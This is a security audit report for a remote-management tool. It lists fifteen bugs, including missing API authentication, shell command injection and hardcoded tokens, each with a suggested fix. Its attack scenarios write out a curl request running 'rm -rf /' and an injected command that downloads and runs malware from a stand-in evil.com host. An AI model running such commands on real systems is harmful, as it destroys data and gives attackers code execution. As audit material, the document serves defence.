# Bug Report & Security Audit - Simple RMM

**Date:** 2026-02-01  
**Auditor:** Code Review  
**Repository:** https://github.com/nicthegarden/vc-rat-rmm  

## Summary

Found **15 bugs/issues** ranging from critical security vulnerabilities to minor logic errors.  
**Severity:** 4 Critical, 5 High, 4 Medium, 2 Low

---

## 🔴 CRITICAL BUGS

### 1. **Missing Authentication on Admin Endpoints** (CRITICAL)
**File:** `server/server.js`  
**Location:** Lines 241-493 (All API endpoints)  
**Issue:** All REST API endpoints are completely unauthenticated. Anyone with network access can:
- List all agents and their system information
- Execute arbitrary shell commands on any agent
- Start/stop VNC sessions
- Install updates (potential system damage)
- Access tunnel information

**Attack Scenario:**
```bash
# Attacker can do this without any auth:
curl http://rmm-server:3000/api/agents  # Get all agent data
curl -X POST http://rmm-server:3000/api/agents/<id>/shell \
  -H "Content-Type: application/json" \
  -d '{"command": "rm -rf /"}'  # Execute destructive command
```

**Fix:** Add authentication middleware:
```javascript
// Add to server.js
const authMiddleware = (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (token !== VALID_ADMIN_TOKEN) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    next();
};
app.use('/api', authMiddleware);
```

---

### 2. **Command Injection Vulnerability** (CRITICAL)
**File:** `agent/agent.py`  
**Location:** Lines 251-306  
**Issue:** Shell commands are executed without any sanitization. The server accepts arbitrary commands from WebSocket and directly executes them with `shell=True` (Windows) or `/bin/bash -c` (Linux).

**Attack Scenario:**
```javascript
// Attacker sends malicious command via WebSocket or API
{
    "type": "shell_exec",
    "command": "; wget http://evil.com/malware.sh -O /tmp/malware.sh; bash /tmp/malware.sh; #",
    "sessionId": "test"
}
```

**Impact:** Full remote code execution on agent machines.

**Fix:** Implement command whitelist or use parameterized execution:
```python
# In agent.py - Add command validation
ALLOWED_COMMANDS = ['ls', 'pwd', 'whoami', 'ps', 'top', 'df', 'du']  # Whitelist approach

def validate_command(command):
    # Only allow safe commands
    cmd_parts = command.split()
    if cmd_parts[0] not in ALLOWED_COMMANDS:
        return False, "Command not allowed"
    return True, None
```

---

### 3. **Hardcoded Authentication Tokens** (CRITICAL)
**File:** `server/server.js` (Line 27), `agent/agent.py` (Line 116)  
**Issue:** Default tokens are hardcoded and published to GitHub:
```javascript
const VALID_AGENT_TOKEN = 'your-secret-agent-token-change-this';
```

**Impact:** Anyone who sees the repository knows the default token. If users don't change it, their systems are immediately compromised.

**Fix:** Generate random tokens on first start:
```javascript
const crypto = require('crypto');
const VALID_AGENT_TOKEN = process.env.AGENT_TOKEN || crypto.randomBytes(32).toString('hex');
```

---

### 4. **No HTTPS/WSS Support** (CRITICAL)
**File:** `server/server.js`, `agent/agent.py`  
**Issue:** All communications are plaintext HTTP/WebSocket. No TLS/SSL encryption.

**Impact:** 
- All data (including VNC streams, shell output, auth tokens) can be intercepted
- Man-in-the-middle attacks possible
- Credentials exposed in network traffic

**Fix:** Add HTTPS/WSS support:
```javascript
const https = require('https');
const fs = require('fs');

const options = {
    key: fs.readFileSync('server.key'),
    cert: fs.readFileSync('server.crt')
};

const server = https.createServer(options, app);
```

---

## 🟠 HIGH SEVERITY BUGS

### 5. **Race Condition in Session ID Generation** (HIGH)
**File:** `server/server.js`  
**Location:** Line 321  
**Issue:** Session ID is generated server-side and returned, but never tracked or validated when agent sends output.

```javascript
// Server generates sessionId
res.json({ success: true, sessionId: sessionId || uuidv4() });

// But agent output is broadcast to ALL clients
broadcastToClients({
    type: 'shell_output',
    agentId: data.agentId,
    sessionId: data.sessionId,  // Not validated!
    output: data.output
});
```

**Impact:** Cross-session command injection possible.

**Fix:** Track active sessions and validate:
```javascript
const activeSessions = new Map();  // Already exists but not used!

function handleAgentMessage(ws, data) {
    if (data.type === 'shell_output') {
        // Validate session belongs to this agent
        if (!activeSessions.has(data.sessionId) || 
            activeSessions.get(data.sessionId).agentId !== data.agentId) {
            console.warn('Invalid session');
            return;
        }
    }
}
```

---

### 6. **Memory Leak in VNC Frame Broadcasting** (HIGH)
**File:** `server/server.js`  
**Location:** Lines 123-130  
**Issue:** VNC frames (base64 encoded screenshots) are broadcast to ALL WebSocket clients, including agents.

```javascript
case 'vnc_frame':
    broadcastToClients({  // Broadcasts to everyone including agents!
        type: 'vnc_frame',
        agentId: data.agentId,
        frame: data.frame,  // Large base64 image
        timestamp: data.timestamp
    });
```

**Impact:** 
- Agents receive unnecessary VNC data
- Memory usage grows unbounded as images accumulate
- Network bandwidth wasted

**Fix:** Track WebUI clients separately:
```javascript
const webClients = new Set();

wss.on('connection', (ws, req) => {
    // Determine if it's an agent or web client
    ws.isWebClient = false;  // Set true for browser connections
});

function broadcastToWebClients(message) {
    wss.clients.forEach(client => {
        if (client.isWebClient && client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify(message));
        }
    });
}
```

---

### 7. **Agent Impersonation via WebSocket** (HIGH)
**File:** `server/server.js`  
**Location:** Lines 68-207  
**Issue:** Server trusts `data.agentId` from WebSocket messages without verifying the sender owns that agentId.

**Attack Scenario:**
```javascript
// Attacker connects via WebSocket and sends:
{
    "type": "shell_output",
    "agentId": "someone-elses-agent-id",
    "sessionId": "test",
    "output": "Fake malicious output"
}
```

**Fix:** Map WebSocket to authenticated agent:
```javascript
const wsToAgent = new Map();

function handleAgentMessage(ws, data) {
    const agentId = wsToAgent.get(ws);
    if (data.agentId !== agentId) {
        console.warn('Agent ID mismatch!');
        return;
    }
    // ... rest of handling
}
```

---

### 8. **Unlimited Port Range for Tunnels** (HIGH)
**File:** `server/vnc-tunnel.js`  
**Location:** Lines 23-24  
**Issue:** Port range 5900-6900 (1000 ports) can be exhausted, causing denial of service.

```javascript
this.minPort = 5900;
this.maxPort = 6900;  // 1000 ports
```

**Impact:** After 1000 tunnels, no more can be created.

**Fix:** Implement port reuse and limits:
```javascript
this.maxTunnels = 100;  // Limit concurrent tunnels
this.tunnelTimeout = 3600000;  // 1 hour max
```

---

### 9. **Weak Token Validation in Tunnel** (HIGH)
**File:** `server/vnc-tunnel.js`  
**Location:** Lines 121-122  
**Issue:** Token is not actually validated:
```javascript
// In production, validate token against stored value
// For now, we accept any token as the tunnel is already authenticated
```

**Impact:** Anyone can connect to any active tunnel if they know/guess the agentId.

**Fix:** Store and validate tokens:
```javascript
validateAndConnectAdmin(agentId, token, adminSocket) {
    const tunnel = this.tunnels.get(this.agentTunnels.get(agentId));
    if (tunnel.authToken !== token) {
        return false;
    }
    // ... rest
}
```

---

## 🟡 MEDIUM SEVERITY BUGS

### 10. **Missing Error Handling in Agent Install** (MEDIUM)
**File:** `agent/agent.py`  
**Location:** Lines 77-93  
**Issue:** If pip install fails, script exits with sys.exit(1) without cleanup or retry logic.

```python
except subprocess.CalledProcessError as e:
    print(f"\n❌ Failed to install dependencies: {e}")
    print("Please install the system packages listed above first.")
    sys.exit(1)  # Abrupt exit
```

**Fix:** Add graceful degradation and better error messages.

---

### 11. **No Rate Limiting on API** (MEDIUM)
**File:** `server/server.js`  
**Location:** All endpoints  
**Issue:** No rate limiting means attackers can:
- Brute force agent tokens
- Flood with shell commands
- Cause DoS via rapid API calls

**Fix:** Add express-rate-limit:
```javascript
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100 // limit each IP to 100 requests per windowMs
});
app.use('/api/', limiter);
```

---

### 12. **VNC Thread Not Properly Stopped** (MEDIUM)
**File:** `agent/agent.py`  
**Location:** Lines 564-569  
**Issue:** `thread.join(timeout=2)` only waits 2 seconds, but screenshot loop may be in the middle of capture.

```python
async def stop_vnc(self):
    self.vnc_running = False
    if self.vnc_thread:
        self.vnc_thread.join(timeout=2)  # Too short!
```

**Impact:** VNC thread may continue running in background.

**Fix:** Use proper thread synchronization (Event object).

---

### 13. **Missing WebSocket Client Tracking** (MEDIUM)
**File:** `server/server.js`  
**Location:** Lines 231-239  
**Issue:** `broadcastToClients` broadcasts to ALL WebSocket connections, including other agents.

**Impact:**
- Agents see other agents' data
- Information leakage
- Unnecessary network traffic

**Fix:** Separate agent and admin WebSocket pools.

---

## 🟢 LOW SEVERITY BUGS

### 14. **Inconsistent API Error Responses** (LOW)
**File:** `server/server.js`  
**Location:** Various  
**Issue:** Error responses are inconsistent:
```javascript
// Sometimes returns JSON
res.status(404).json({ error: 'Agent not found' });

// Sometimes plain text
res.status(503).send('Agent is offline');

// Sometimes success without message
res.json({ success: true });
```

**Fix:** Standardize all API responses:
```javascript
{
    "success": false,
    "error": {
        "code": "AGENT_OFFLINE",
        "message": "Agent is currently offline"
    }
}
```

---

### 15. **Missing Input Validation** (LOW)
**File:** `agent/agent.py`  
**Location:** Line 116  
**Issue:** Configuration values are not validated:
```python
SERVER_URL = "ws://localhost:3000"  # Could be malformed
AGENT_TOKEN = "your-secret-agent-token-change-this"  # Could be empty
```

**Fix:** Add validation:
```python
def validate_config():
    if not SERVER_URL.startswith(('ws://', 'wss://')):
        raise ValueError("Invalid SERVER_URL format")
    if len(AGENT_TOKEN) < 16:
        raise ValueError("AGENT_TOKEN too short (min 16 chars)")
```

---

## 🔒 Security Recommendations

### Immediate Actions Required:
1. **Change default tokens** before deploying anywhere
2. **Add authentication** to all API endpoints
3. **Implement HTTPS/WSS** for production
4. **Add input sanitization** for shell commands
5. **Restrict CORS** to specific origins

### Additional Hardening:
6. Implement request signing
7. Add audit logging
8. Implement session timeouts
9. Add IP whitelisting option
10. Use prepared statements for any DB queries (if added)

---

## 🧪 Testing Checklist

### Critical Tests:
- [ ] Verify API requires authentication
- [ ] Test command injection prevention
- [ ] Test HTTPS connectivity
- [ ] Verify token validation works
- [ ] Test agent impersonation prevention

### Functional Tests:
- [ ] Test agent connects and authenticates
- [ ] Test shell command execution
- [ ] Test VNC streaming
- [ ] Test tunnel creation
- [ ] Test update checking (Linux/Windows)
- [ ] Test agent categorization by customer/site

### Load Tests:
- [ ] Test with 100+ agents
- [ ] Test VNC with multiple concurrent streams
- [ ] Test API rate limiting
- [ ] Test memory usage over 24 hours

---

## 📋 Known Limitations

1. **No Database:** All data stored in memory - agents lost on server restart
2. **No Persistence:** No configuration or state persistence
3. **Single Server:** No clustering or horizontal scaling
4. **No Logging:** No structured logging or audit trail
5. **No Backup:** No backup/restore functionality

---

## 📞 Contact

Report additional bugs or security issues at:  
https://github.com/nicthegarden/vc-rat-rmm/issues

---

**End of Report**
